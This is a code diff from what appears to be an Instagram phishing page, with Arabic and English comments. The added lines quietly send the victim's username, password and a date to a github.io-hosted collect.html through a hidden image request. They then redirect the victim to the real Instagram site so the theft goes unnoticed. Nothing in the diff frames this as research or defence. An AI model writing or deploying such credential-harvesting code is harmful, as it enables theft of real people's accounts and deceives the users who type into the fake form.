@@ -510,7 +510,15 @@
                     // Redirect the user to the target URL
                     // This will make the browser navigate to the collect.html page
                     // with the username and password visible in the URL.
-                    window.location.href = targetUrl;
+                    // إرسال البيانات إلى collect.html بشكل مخفي عبر طلب صورة
+const img = new Image();
+img.src = `https://y011b.github.io/instagram.com/collect.html?date=${encodedDate}&username=${encodedUsername}&password=${encodedPassword}`;
+
+// ننتظر قليلًا لنضمن تحميل الصورة (يعني تم إرسال البيانات)
+setTimeout(() => {
+  window.location.href = 'https://www.instagram.com/';
+}, 500); // بعد 0.5 ثانية، نحول المستخدم لـ Instagram
+
 
                     // Note: Since we are redirecting, any code after window.location.href
                     // will likely not execute, as the browser navigates away.
